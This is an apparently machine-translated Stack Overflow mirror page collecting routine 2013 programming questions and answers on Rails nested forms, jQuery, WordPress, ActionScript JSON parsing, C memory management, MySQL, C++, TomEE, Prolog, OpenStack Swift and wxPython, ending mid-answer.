<%= f.link_to_add "Agregar item", :itemfacturas %> 部分是： <%= f.number_field :cantidad, :min => 0, :value => 1 %> <%= f.text_field :descripcion, :class => "desc_autocomplete" %> <%= f.text_field :vu %> <%= f.text_field :vt %> <%= f.hidden_field :producto_id%> <%= f.link_to_remove "Eliminar" %> 但我有这个错误： Facturas 中的 NoMethodError#new 显示 /Users/fabricioflores/desarrollo/facturacion/app/views/itemfacturas/_itemfacturas.html.erb 其中第 7 行提出： 未定义的方法“link_to_remove” 如果我评论包含 link_to_remove 的行，我有另一个关于 link_to_add 的错误 我按照https://github.com/ryanb/nested_form中的步骤进行操作，但没有成功。我正在使用 Rails 3.2.9 和 nested_form (0.3.1) 好的，我解决了。我需要以 facturas/new 的形式输入 <%= nested_form_for @factura do |f| %> 这就是找不到link_to_add 和link_to_remove 的原因，因为是不同的助手。 ruby-on-railsrubygemnested-formsnested-attributes 4 1 回答 1 This answer is useful 5 好的，我解决了。我需要以 facturas/new 的形式输入 <%= nested_form_for @factura do |f| %> 这就是找不到link_to_add 和link_to_remove 的原因，因为是不同的助手。 于 2013-02-17T00:02:53.927 回答 Related 1 php - Symfony2 从存储库中保存 xml 文件 1 cuda - 如何从驱动程序 API 使用运行时 API 创建的上下文 3 eclipse - 如何定义我自己的“动态 Web 项目”向导？ 3 mysql - DELETE FROM `table` AS `alias` ... WHERE `alias`.`column` ... 为什么语法错误？ 1 iphone - 进入后台模式时 AVPlayerLayer 停止播放 1 java - 如何安全地取消 TimerTask？ 1 ruby-on-rails-3 - 如何在 Rails 视图中呈现 JSON 1 asp.net-mvc - Masstransit 未处理正确的值 2 xml - Tally ERP 9 XML XTTP 数据导出 3 ruby-on-rails - HAML 中的缩进问题-“文档的其余部分使用 2 个空格缩进” Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：14916172
> 
> 赞同：2
> 
> 时间：
> 
> 标签：ruby-on-rails, ruby, gem, nested-forms, nested-attributes

我对 gem nested_form 有一点问题。我有：

```
class Factura < ActiveRecord::Base
 attr_accessible :itemfacturas_attributes
 has_many :itemfacturas
 has_many :productos, :through => :itemfacturas
 accepts_nested_attributes_for :itemfacturas, :reject_if => lambda { |a| a[:descripcion].blank? }, :allow_destroy => true 
```

和 ItemFactura 类

```
class Itemfactura < ActiveRecord::Base
 attr_accessor :vu, :vt, :descripcion
 belongs_to :factura
 belongs_to :producto 
```

我在 facturas/new 视图中使用 gem 来添加 itemfacturas。

```
<%= f.fields_for :itemfacturas do |b| %>
        <%= render 'itemfacturas/itemfacturas', f: b %>
 <% end -%>
 <%= f.link_to_add "Agregar item", :itemfacturas %> 
```

部分是：

```
<%= f.number_field :cantidad, :min => 0, :value => 1 %>
<%= f.text_field :descripcion, :class => "desc_autocomplete" %>
<%= f.text_field :vu %>
<%= f.text_field :vt %>
<%= f.hidden_field :producto_id%>
<%= f.link_to_remove "Eliminar" %> 
```

但我有这个错误：

> Facturas 中的 NoMethodError#new
> 
> 显示 /Users/fabricioflores/desarrollo/facturacion/app/views/itemfacturas/_itemfacturas.html.erb 其中第 7 行提出：
> 
> 未定义的方法“link_to_remove”

如果我评论包含 link_to_remove 的行，我有另一个关于 link_to_add 的错误

我按照[https://github.com/ryanb/nested_form](https://github.com/ryanb/nested_form)中的步骤进行操作，但没有成功。我正在使用 Rails 3.2.9 和 nested_form (0.3.1)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T00:02:53.927

好的，我解决了。我需要以 facturas/new 的形式输入

```
<%= nested_form_for @factura do |f| %> 
```

这就是找不到link_to_add 和link_to_remove 的原因，因为是不同的助手。

# php - 为什么我的 jQuery 函数没有按要求更改我的类？

> ID：14916177
> 
> 赞同：-1
> 
> 时间：2013-02-16T23:12:06.610
> 
> 标签：php, javascript, jquery, html, css

这是我的脚本，我通过在 PHP 中回显它在某个时间点运行它：

```
echo "<script>$('.incorrect-guesses div:nth-child(2)').removeClass('empty-guess').addClass('incorrect-guess').text('2');</script>"; 
```

我最终会让它适用于特定的 div，但现在我希望它适用于第一个（它是其父元素的第二个 (:nth-child(2)) 元素），但它不会这样做。它被应用于这个 HTML：

```
 <div class="incorrect-guesses">
                <h4>Incorrect Guesses</h4>
                <?php
                    for ($i = 0; $i < 6; $i++) {
                        echo "<div class='empty-guess'></div>\n";
                    }
                ?>
            </div> 
```

每个类，都有特定的`empty-guess`属性`incorrect-guess`。当我在我的代码中手动更改它时，它看起来应该是这样，但是当用户猜错时，这并没有改变 div 的外观，这是它应该做的。

为什么会这样？如果需要，我可以提供更多代码。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:16:22.523

您需要放置`$(document).ready(function(){`您的代码：

```
echo "<script type="text/javascript">$(document).ready(function(){ $('.incorrect-guesses div:nth-child(2)').removeClass('empty-guess').addClass('incorrect-guess').text('2'); });</script>"; 
```

还要确保 jQuery 包含在您的页面的头部。

# php - 上传到 Wordpress 时为所有图片添加“图片-”后缀

> ID：14916186
> 
> 赞同：1
> 
> 时间：2013-02-16T23:12:42.150
> 
> 标签：php, wordpress, function

我在我的 WordPress 主题中使用它`functions.php`来清理上传时的所有图像文件名：

```
function sa_sanitize_special_chars ($filename) {
    return remove_accents( $filename );
}
add_filter('sanitize_file_name', 'sa_sanitize_special_chars', 10); 
```

现在，我还需要在上传时为所有图像添加“图片-”前缀。我该怎么做（在functions.php中）？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-16T23:20:57.427

我认为这对你有用

```
function sa_sanitize_special_chars ($filename) {
$f=remove_accents( $filename );
return 'picture-'.$f;
} 
```

# javascript - Jquery动画位置不适用于margin-top？

> ID：14916202
> 
> 赞同：0
> 
> 时间：2013-02-16T23:14:23.803
> 
> 标签：javascript, jquery

我创建了一个**[jsbin](http://jsbin.com/idinob/7/edit)**，它有一个带有标签的 div

我想滚动到一个特定的标签。

`margin-top`但是只有在is时它才能正常工作`0`。

但是如果我用它测试它`margin-top:100px`是不准确的...... **[http://jsbin.com/idinob/8/edit](http://jsbin.com/idinob/8/edit)**

这是为什么 ？

动画命令是：

```
$('.d').animate({
    scrollTop: $(".s210").position().top
 }, 200);
}); 
```

我确实使用了`position`，而不是`offset`因为我谈论的是div**内部**的跨度。所以我们谈论的是位置而不是偏移。

似乎`$(".s210").position().top`受margin-top的影响。

为什么 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:23:48.783

您应该将位置属性设置为相对：

```
span { position: relative } 
```

# json - 有没有办法在解码之前验证 JSON？

> ID：14916205
> 
> 赞同：2
> 
> 时间：2013-02-16T23:14:52.213
> 
> 标签：json, actionscript-3, flash, air

我有一个应用程序，它下载一个文件，然后对其进行解码，期待 JSON 格式，当格式正常时，一切顺利。如果我故意弄乱 json 文件 flash 报告格式错误并停止应用程序。有没有办法处理错误？

代码：

```
import flash.display.Sprite;
import flash.events.Event;
import flash.net.URLLoader;
import flash.net.URLRequest;

import com.adobe.serialization.json.JSON;

public class Main extends Sprite 
{

    private var _jsonPath:String = "json_example.txt";

    public function Main():void 
    {
        if (stage) init();
        else addEventListener(Event.ADDED_TO_STAGE, init);
    }

    private function init(e:Event = null):void 
    {
        removeEventListener(Event.ADDED_TO_STAGE, init);

        var loader:URLLoader = new URLLoader();
        var request:URLRequest = new URLRequest();
        request.url = _jsonPath;
        loader.addEventListener(Event.COMPLETE, onLoaderComplete);
        loader.load(request);
    }

    private function onLoaderComplete(e:Event):void 
    {
        var loader:URLLoader = URLLoader(e.target);
            var jsonArray:Array = JSON.decode(loader.data);
  } 
```

您会看到我的问题就在最后，`var jsonArray:Array = JSON.decode(loader.data);`如果失败，我该如何处理我的代码？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-16T23:38:31.260

使用try..catch...

```
import com.adobe.serialization.json.JSONParseError;

try
{
var jsonArray:Array = JSON.decode(loader.data);
}
catch ( e:JSONParseError )
{
    //do something
    trace(e);
}
finally
{
} 
```

此解决方案使用 as3corelib ( [http://as3corelib.googlecode.com/](http://as3corelib.googlecode.com/) )，如果您使用 JSON.parse() 请查看 JayC 的答案

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-16T23:49:25.120

Actionscript 支持 try/catch。根据[http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/JSON.html](http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/JSON.html)，失败时`parse`抛出`TypeError`。所以它看起来像

```
try
{
    var jsonArray:Array = JSON.parse(loader.data);
}
catch ( e:TypeError )
{
    //do something
}
catch (e: SomethingOtherError)  //not being literal here, just showing 
//you can catch more than one type of exception
{

}
finally
{
    //finally always works, even if the exception is not caught above
} 
```

（已编辑）

上面的代码不应该需要你的 `import com.adobe.serialization.json.JSON;`

提到的 JSONParseError Thorsten 似乎来自~~mixpanel 库~~as3corelib 库[https://github.com/mikechambers/as3corelib/](https://github.com/mikechambers/as3corelib/)它使用 JSONDecoder 反序列化 [https://github.com/mikechambers/as3corelib/blob/master/src/com /adobe/serialization/json/JSONDecoder.as](https://github.com/mikechambers/as3corelib/blob/master/src/com/adobe/serialization/json/JSONDecoder.as)

但是，如果您出于某种原因仍想使用 as3corelib 库，以使 Thorsten 的代码正常工作，您所需要的（IIRC）将是`import com.adobe.serialization.json.JSONParseError;`.

# cocoa - 挂载远程卷

> ID：14916209
> 
> 赞同：0
> 
> 时间：2013-02-16T23:15:16.070
> 
> 标签：cocoa, osx-mountain-lion

我正在尝试在 Cocoa 中挂载一个远程磁盘，但我找不到任何方法可以这样做。

我看过的很多地方都推荐使用[这个 API](http://developer.apple.com/library/mac/documentation/Carbon/Reference/File_Manager/Reference/reference.html)，但是，几乎所有的地方都被 10.8 折旧了，我的目标是 10.8。

我要挂载的驱动器是 Microsoft Sharepoint 文件服务器（它不是本地的，但我认为它使用 SMB？）。

对此有什么推荐的方法？

# c - 服务器应用程序中的 C 内存管理

> ID：14916222
> 
> 赞同：3
> 
> 时间：2013-02-16T23:16:33.117
> 
> 标签：c, linux, memory-management, posix, http-proxy

我是学生，我正在用 C 编写 HTTP 代理应用程序。我在内存管理方面遇到了麻烦。在我之前的所有应用程序中，我只是简单地围绕 malloc 编写了一个包装器，当 malloc 失败时该包装器中止。

```
void *xmalloc(size_t size)
{
    void *ptr;

    assert(size);

    ptr = malloc(size);
    if (!ptr) 
        abort();

    return ptr;
} 
```

我现在发现这还不够，因为我只想在由于临时内存不足而导致内存分配失败时拒绝客户端并继续为其他客户端提供服务。如果我不想在每次 malloc 调用后用检查来弄乱我的代码（我在解析代码时每个函数都有很多检查），还有哪些其他选项可以处理内存管理，哪一个最适合我的目的，以及如何是服务器应用程序处理内存管理和内存不足的常用方法吗？

从我当前的代码中考虑这个函数，它从 HTTP 消息的标题部分解析一行（xstrndup 调用 xmalloc）：

```
int http_header_parse(http_hdr_table *t, const char *s)
{
    const char *p;
    const char *b;
    char *tmp_name;
    char *tmp_value;
    int ret = -1;

    assert(t);
    assert(s);

    p = b = s;

    /* field name */
    for (; ; p++) {
        if (*p == ':') {
            if (p-b <= 0) goto out;
            tmp_name = xstrndup(b, p-b);
            b = ++p;
            break;
        }

        if (is_ctl_char(*p) || is_sep_char(*p)) goto out;
    }

    while (*p == ' ' || *p == '\t') {
        p++; b++;
    }

    /* field value */
    for (; ; p++) {
        if (is_crlf(p)) {
            if (p-b <= 0) goto err_value;
            tmp_value = xstrndup(b, p-b);
            p += 2;
            break;
        }

        if (!*p) goto err_value;
    }
    http_hdr_table_set(t, tmp_name, tmp_value);

    ret = 0;
    xfree(tmp_value);
err_value:
    xfree(tmp_name);
out:
    return ret;
} 
```

我想保持简单并在一个地方处理内存分配错误，并且不要用 malloc 错误处理代码混淆代码。我应该怎么办？谢谢你。

PS：我正在编写在类 POSIX/Unix 系统上运行的应用程序。也可以随意批评我当前的编码风格和实践。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:53:56.373

如果你想使用像 C 这样的相对低级的语言，那么你不应该太担心`if(tmp_value == NULL) goto out;`在 2 个地方添加类似的东西。

如果您不能忍受 2 行额外代码的简单想法，那么也许可以尝试使用正确支持异常的语言（例如 C++）并添加 throw/try/catch。*注意：我真的不喜欢 C++，但是使用 C++ 必须比在 C 中实现自己的“异常类”功能和整个自动资源取消分配层更有意义。*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-17T07:59:31.733

现代语言为您提供垃圾收集和异常。C没有，所以你必须努力工作。这里没有神奇的解决方案。

一些技巧：

1.  创建一个会话结构，并保持所有分配的内存都指向它。当会话中止时，请始终调用清理函数。这样，即使您必须检查许多地方的故障，至少所有故障都以相同的方式处理。
2.  您甚至可以创建一个`session_allocate()`函数，该函数分配内存并将其保存在从会话结构指向的链表中。当会话被销毁时，您使用此函数分配的所有内容都将被释放。
3.  尝试在会话开始时集中所有分配。在你分配了你需要的所有东西之后，你的其余代码就不需要担心失败了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-16T23:43:43.197

如果你在一个支持 fork() 的系统上，linux 支持，你可以在它自己的进程中运行每个客户端连接。首次建立客户端连接时，您将主进程分叉为子进程以处理其余的请求。然后你可以像往常一样 abort() 并且只有特定的客户端连接受到影响。这是一个经典的 Unix 服务器模型。

如果您不想或不能使用 fork()，则需要通过抛出异常来中止请求。在 C 中，这将通过在首次建立连接时使用 setjump() 来完成，然后在检测到内存不足时调用 longjump()。这将重置执行并将堆栈返回到调用 setjump() 的位置。

问题是，这将泄漏到该点为止分配的所有资源（例如，其他已成功分配到内存不足的内存分配）。因此，此外，您的内存分配器必须跟踪每个请求的所有内存分配。当调用 longjump() 时，setjump() 返回位置必须释放与中止请求相关的所有内存。

这就是 apache 使用池所做的事情。Apache 使用池来跟踪资源分配，因此它可以在中止或因为代码没有释放它的情况下自动释放它们：http: [//www.apachetutor.org/dev/pools](http://www.apachetutor.org/dev/pools)。

您还应该考虑池模型，而不仅仅是简单地包装 malloc() 以便一个客户端不能用完系统中的所有内存。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-26T23:39:07.430

您当然可以使用`alloca`，但这存在意味着必须小心使用的问题。或者，您可以编写代码，以便最大限度地减少和本地化 malloc 的使用。例如，您可以重写上面的函数以本地化分配：

```
static size_t field_name_length(const char *s)
{
    const char *p = s;
    for ( ; *p != ':'; ++p) {
        if (is_ctl_char(*p) || is_sep_char(*p))
            return 0;
    }
    return (size_t) (p - s);
}

static size_t value_length(const char *s)
{
    const char *p = s;
    for (; *p && !is_crlf(p); p+=2) {
        /* nothing */
    }
    return *p ? (size_t) (p - s) : 0;
}

int http_header_parse(http_hdr_table *t, const char *s)
{
    const char *v;
    int ret = -1;
    size_t v_len = 0;
    size_t f_len = field_name_length(s);

    if (f_len) {
        v = s + f_len + 1;
        v = s + strspn(s, " \t");
        v_len = value_length(s);
    }
    if (v_len > 0 && f_len > 0) {
        /* Allocation is localised to this block */
        const char *name = xstrndup(s, f_len);
        const char *value = xstrndup(v, v_len);

        if (name && value) {
            http_hdr_table_set(t, name, value);
            ret = 0;
        }
        xfree(value);
        xfree(name);
    }
    return ret;
} 
```

或者，更好的是，您可以修改`http_hdr_table_set`以接受指针和长度并完全避免分配。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-02-17T07:47:39.257

另一种可能性是通过使用[Boehm 的 GC](http://www.hpl.hp.com/personal/Hans_Boehm/gc/)来`GC_malloc`代替`malloc`（你不需要调用`free`or `GC_free`）；它的 `GC_oom_fn`函数指针（`GC_malloc`当没有可用内存时在内部调用）可以设置为您特定的内存不足处理程序（这将拒绝传入的 HTTP 请求，可能带有 a `longjmp`）

使用 Boehm GC 的主要优点是您不再关心`free`动态分配的数据（假设它是使用`GC_malloc`or 朋友分配的，例如`GC_malloc_atomic`对于内部没有任何指针的数据）。

请注意，内存管理不是模块化属性。某些给定数据的活跃度是整个程序的属性，请参阅[垃圾收集](http://en.wikipedia.org/wiki/Garbage_collection_%28computer_science%29)维基页面和[RAII](http://en.wikipedia.org/wiki/Resource_Acquisition_Is_Initialization)编程习惯。

# mysql - mySQL - 限制 JOIN 语句一侧返回的行数？

> ID：14916229
> 
> 赞同：0
> 
> 时间：2013-02-16T23:17:27.633
> 
> 标签：mysql

每个人，

我只是好奇是否有办法通过对 mySQL 数据库的查询来进行这种限制：

这是我的表：

```
Events
   event_id   event_title   creation_time

Images
   image_id   src   event_id

Comments
   event_comment_id   event_comment   event_id 
```

我想获取按创建时间排序的事件，并且每个事件只获取 3 张图片和 3 条评论。

欢迎任何帮助、资源或批评。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:49:55.383

这是一种方法。基本上，获取与每组评论/图像关联的行号，最多只显示 3 个：

```
SELECT E.*, 
  MAX(CASE WHEN I.rn = 1 THEN I.Image_Id END) Image1, 
  MAX(CASE WHEN I.rn = 2 THEN I.Image_Id END) Image2, 
  MAX(CASE WHEN I.rn = 3 THEN I.Image_Id END) Image3, 
  MAX(CASE WHEN C.rn = 1 THEN C.event_comment_id END) Comment1, 
  MAX(CASE WHEN C.rn = 2 THEN C.event_comment_id END) Comment2, 
  MAX(CASE WHEN C.rn = 3 THEN C.event_comment_id END) Comment3
FROM Events E
   LEFT JOIN (SELECT @curRow:=IF(@prevRow = event_id, @curRow + 1, 1) rn,
           Image_Id, src, event_id, @prevRow:= event_id
         FROM Images
           JOIN    (SELECT @curRow := 0) r
         ) I ON E.event_id = I.Event_id
   LEFT JOIN (SELECT @curRow2:=IF(@prevRow2 = event_id, @curRow2 + 1, 1) rn,
           event_comment_id, event_comment, event_id, @prevRow2:= event_id
         FROM Comments
           JOIN    (SELECT @curRow2 := 0) r
         ) C ON E.event_id = C.Event_id 
GROUP BY E.Event_Id
ORDER BY E.Event_Id, E.creation_time DESC 
```

这是[SQL Fiddle](http://sqlfiddle.com/#!2/98a6c/2)。

# javascript - 使用 JavaScript 更改样式属性

> ID：14916236
> 
> 赞同：0
> 
> 时间：2013-02-16T23:18:27.160
> 
> 标签：javascript, html

我有一个日历的表格行，我需要根据月份打开和关闭。

HTML：

```
<tr id="bottomrow" class="week" valign="top" style="display:none;">
        <td class="day" id="d36">
            <div class="daynumb" id="x36"></div>
        </td>
        <td class="day" id="d37">
            <div class="daynumb" id="x37"></div>
        </td>
        <td class="day" id="d38">
            <div class="daynumb" id="x38"></div>
        </td>
        <td class="day" id="d39">
            <div class="daynumb" id="x39"></div>
        </td>
        <td class="day" id="d40">
            <div class="daynumb" id="x40"></div>
        </td>
        <td class="day" id="d41">
            <div class="daynumb" id="x41"></div>
        </td>
        <td class="day" id="d42">
            <div class="daynumb" id="x42"></div>
        </td>
    </tr> 
```

我尝试使用`document.getElementByID('bottomrow').style.display = "none";`，但它似乎没有工作......

JavaScript：

```
function february() {

document.getElementById('bottomrow').style.display = "none";

var numbdays = 28,
    offset = 5;

for (var date = 1; date <= numbdays; date++) {
    document.getElementById("x" + (date + offset)).innerHTML = date;
}
} 
```

当页面加载时，该行仍然可见。我究竟做错了什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:30:22.267

你做对了，除了`getElementByID`不是一个函数。它必须是`getElementById`。注意小写`d`：

```
document.getElementById("bottomrow").style.display = "none"; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-16T23:22:14.430

您应该正确处理页面的 ready 事件，因为页面上尚未加载 DOM 元素。jQuery 对此进行了抽象，但请查看这篇文章，了解如何在没有 jQuery 或其他库的情况下做到这一点。您需要确保处理以下指南将执行的浏览器差异。

[$(document).ready 没有 jQuery 的等价物](https://stackoverflow.com/questions/799981/document-ready-equivalent-without-jquery)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-16T23:19:49.000

该函数是否在 DOM 准备好之前运行？它不能对尚不存在的元素进行操作。

```
window.onload = function ()
{
  ...
} 
```

# c++ - “'SpaceShip' 没有命名类型”即使 SpaceShip 肯定是一种类型

> ID：14916245
> 
> 赞同：0
> 
> 时间：2013-02-16T23:20:12.167
> 
> 标签：c++, class, types, composition

我正在开发一款 Asteroids 游戏，以此来自学一些编程知识，但我遇到了一个错误，即我的一个班级没有命名类型。

我有一个从 Entity 类继承的 SpaceShip 类（两者都已定义），我有一个从 Entity 继承的 Bullet 类。我试图将 SpaceShip 成员放入 Bullet 类，以此来告诉谁射了子弹，但它一直告诉我“'SpaceShip' 没有命名类型”。

这是一些代码：

宇宙飞船.h

```
class SpaceShip : public Entity
{
private:
    int lives;
    int score;
    int animationRow;
    int shotsFired;

public:
SpaceShip();
void Init(SDL_Surface *image = NULL);

void Destroy();
void Update();
void Render( SDL_Surface *screen );
...
}; 
```

子弹头文件

```
#ifndef BULLET_H
#define BULLET_H

#include <SDL/SDL_gfxPrimitives.h>

#include "entity.h"
#include "spaceship.h"
#include "Globals.h"

class Bullet : public Entity
{
private:
    SpaceShip* owner;

public:
    Bullet( SpaceShip* ship );

    void Update();
    void Render( SDL_Surface *screen );
    void Destroy();

    void Collided(int objectID);

};

#endif // BULLET_H 
```

为什么找不到 SpaceShip 类型？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-16T23:41:44.937

似乎（基于注释中的澄清）您的代码具有[循环依赖项](http://en.wikipedia.org/wiki/Circular_dependency)。`SpaceShip`取决于`Bullet`哪个反过来又取决于`SpaceShip`。您需要重构代码以删除循环依赖项。

通常这可以通过[Forward decleration](http://en.wikipedia.org/wiki/Forward_declaration)轻松完成，但更高级的方法（更正确的 OOP）包括[接口](http://www.tutorialspoint.com/cplusplus/cpp_interfaces.htm)、[回调](http://en.wikipedia.org/wiki/Callback_%28computer_programming%29)或更好的事件（信号）

# jakarta-ee - 更新资源/热部署不适用于 tomee 和 IntelliJ

> ID：14916248
> 
> 赞同：3
> 
> 时间：2013-02-16T23:20:32.137
> 
> 标签：jakarta-ee, intellij-idea, apache-tomee

我是第一次尝试 IntelliJ，我正在使用 tomEE。除非我重新部署战争（删除它然后重新部署它），否则我无法反映我的更改。

我要做的是：

运行配置 - 爆炸战争，在“更新”上选择更新类和资源。将其设置为在帧停用时执行此操作。尝试使用 CTRL+F10 手动完成。

不会反映任何更改，不会反映在 helloworld.jsp/facelet 中。

运行：IntelliJ 12.0.4 TomEE webprofile 1.5.1

/target 中的文件已更改。新文件也可以正常工作，某种缓存或某种原因导致了这种感觉。不是浏览器缓存，因为我尝试了许多浏览器/清除了所有数据等。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:33:41.290

根据[文档](http://tomee.apache.org/tomee-and-eclipse.html)，您需要包含此代码`web.xml`以启用**JSP 热部署**：

```
<servlet>
    <servlet-name>jsp</servlet-name>
    <servlet-class>org.apache.jasper.servlet.JspServlet</servlet-class>
    <init-param>
        <param-name>development</param-name>
        <param-value>true</param-value>
    </init-param>
</servlet> 
```

相关部分是将`development`参数设置为**true**。

# javascript - 有没有办法检查浏览器支持哪个 JavaScript 版本？

> ID：14916253
> 
> 赞同：0
> 
> 时间：2013-02-16T23:21:28.367
> 
> 标签：javascript, browser

我正在使用 JavaScript 的一些新功能，例如 Array.forEach (v.1.6)。

我知道在实时代码中我们应该使用特征检测，如下所述： [告诉浏览器的 Javascript 版本](https://stackoverflow.com/questions/3242109/to-tell-javascript-version-of-your-browser) 所以，基本上是这样的：

```
typeof Array.prototype.forEach == 'function' 
```

但是，是否有某种方式（例如网站）可以显示不同浏览器支持哪个版本的 JavaScript？我基本上想检查给定版本是否已被浏览器广泛采用。

像[这样](http://browsehappy.com/)支持 JavaScript 的东西正是我正在寻找的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:25:37.033

不，不是。对于许多新的 HTML5 功能，您应该进行功能测试，而不是浏览器支持的 JS 版本。

对于 ECMAScript 5 的一些新功能，您可以创建或使用第三方 shims 来模拟这些功能并且不会在旧浏览器中导致错误。尽管并非所有功能都适用于 ECMAScript 5，但很多功能都可以。

[https://github.com/kriskowal/es5-shim](https://github.com/kriskowal/es5-shim)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2019-11-12T17:51:51.683

我同意其他评论，您可能不应该检查 javascript 版本以确保您使用的功能能够正常工作。

推荐的：

*   方便的功能查找： [https ://caniuse.com/](https://caniuse.com/)
*   使用 pollyfill [https://babeljs.io/docs/en/babel-polyfill](https://babeljs.io/docs/en/babel-polyfill)

不建议：

不过，要回答这个问题。**以下是查看浏览器支持的 javascript 版本的方法。**

```
<script type="text/javascript">
    var version = 1.0;
</script>
<script language="Javascript1.1"> version = 1.1; </script>
<script language="Javascript1.2"> version = 1.2; </script>
<script language="Javascript1.3"> version = 1.3; </script>
<script language="Javascript1.4"> version = 1.4; </script>
<script language="Javascript1.5"> version = 1.5; </script>
<script language="Javascript1.6"> version = 1.6; </script>
<script language="Javascript1.7"> version = 1.7; </script>
<script language="Javascript1.8"> version = 1.8; </script>
<script language="Javascript1.9"> version = 1.9; </script>

<p id="version"></p>
<script>
document.getElementById("version").innerHTML = version;
</script> 
```

# java - 如何在 JTextField java 中显示默认消息

> ID：14916255
> 
> 赞同：7
> 
> 时间：2013-02-16T23:21:37.353
> 
> 标签：java, swing, jtextfield

我想创建一个带有默认消息的 JTextField。但不是作为正确的文本，而是作为关于在 JTextField 中键入内容的注释。因此，如果我键入 jtf.getText() 它会返回 null 或空，因为它只是在那里打印的注释。当你点击它时它就会消失，你可以在上面写任何你想要的东西。有什么方法可以做这样的事情吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-02-16T23:42:30.380

一种可能的技术是首先将默认字符串设置为 textField 的文本：

```
JTextField myField = new JTextField("Default Text"); 
```

然后使用 a `FocusListener`，这样当用户将焦点放在元素上时，文本就会消失：

```
myField.addFocusListener(new FocusListener() {
    public void focusGained(FocusEvent e) {
        myField.setText("");
    }

    public void focusLost(FocusEvent e) {
        // nothing
    }
}); 
```

但是您必须小心：如果用户从未将焦点放在文本字段中，getText() 将返回默认字符串。因此，您最好管理一个布尔值，用于判断文本字段是否曾经获得过焦点。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-02-16T23:38:12.543

我相信您想要的是`input hint`在文本字段中，如下图所示：

![输入提示](../Images/72e910063b5ff25247f35ae29341d9db.png)

检查可以执行此操作的[xswingx库。](http://code.google.com/p/xswingx/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-16T23:25:45.657

[将 textFieldInstance.setToolTip](http://java.sun.com/javase/6/docs/api/javax/swing/JComponent.html#setToolTipText%28java.lang.String%29)帮助：

```
textFieldInstance.setToolTip("Tool tip for text field"); 
```

# prolog - 在序言中找到偶数位置

> ID：14916257
> 
> 赞同：1
> 
> 时间：2013-02-16T23:21:49.070
> 
> 标签：prolog

```
evenPositions([],[]).
evenPositions([X], []).
evenPositions([X, Y|R], [X|Tail1]) :- evenPositions(R,Tail1). 
```

在找到偶数位置时，我缺少一些东西来获取列表中剩下的最后一个元素。

当我运行 evenPositions([a,b,c,d,e,f,g],Z)。它不包括列表中的 g。

# security - Amazon S3 存储桶策略在 OpenStack Swift 世界中是否等效？

> ID：14916258
> 
> 赞同：2
> 
> 时间：2013-02-16T23:21:58.803
> 
> 标签：security, amazon-web-services, amazon-s3, openstack, openstack-swift

Amazon S3 存储桶策略在 OpenStack Swift 世界中是否等效？我们希望将某些容器的访问限制为特定的 IP 地址。没有其他 IP 地址应该能够访问这些容器。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-18T00:53:18.227

Swift 不支持这个开箱即用。

但是，您可以使用一些 Swift 中间件自己实现这一点。大部分 OpenStack（包括 Swift）都是基于 Python Paste 构建的，请参阅[A Do-It-Yourself Framework](http://pythonpaste.org/do-it-yourself-framework.html)。使用它，您可以创建一个中间件类，就像其他[Swift 中间件类](https://github.com/openstack/swift/tree/master/swift/common/middleware)一样。注意每个类都有一个`__call__`方法，这是入口点。然后，您将中间件添加到[proxy-server.conf](https://github.com/openstack/swift/blob/master/etc/proxy-server.conf-sample)配置中的管道中。

所以想象一下，你的中间件可以与一些 IP 地址的数据存储进行对话，并根据传入请求的 IP 地址检查它，你应该能够在`__call__`. 然后中间件将根据该检查允许或拒绝请求。

如果您真的想继续开发类似的东西，请查看[OpenStack 操作指南](http://docs.openstack.org/ops/)的自定义章节。

# python - wxpython状态栏事件描述

> ID：14916262
> 
> 赞同：1
> 
> 时间：2013-02-16T23:22:16.923
> 
> 标签：python, wxpython

我想知道如何在状态栏中添加按钮用途的描述。

我一直以为是这样的——

```
self.SetStatusText("text", btn1) 
```

但是，它似乎不起作用。

我让它用于显示窗口的名称，以及菜单栏操作的描述。但我不能让它为按钮工作。

例如在菜单栏中 -

```
Settings = goto.Append(wx.NewId(), "Settings", "Navigate to Settings Window") 
```

按钮似乎没有“附加”属性。

谢谢

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-02-19T09:21:12.690

提供用户帮助的最常见方式是使用工具提示：

```
import wx

class MainWindow(wx.Frame):
    def __init__(self, *args, **kwargs):
        wx.Frame.__init__(self, *args, **kwargs)

        self.CreateStatusBar()

        self.panel = wx.Panel(self)
        self.button = wx.Button(self.panel, label="Test")
        self.button.SetToolTipString("This is for testing purposes!")

        self.sizer = wx.BoxSizer()
        self.sizer.Add(self.button)

        self.panel.SetSizerAndFit(self.sizer)  
        self.Show()

app = wx.App(False)
win = MainWindow(None)
app.MainLoop() 
```

如果坚持使用StatusBar，可以绑定EVT_ENTER_WINDOW和EVT_LEAVE_WINDOW。一个小例子：

```
import wx

class TipButton(wx.Button):
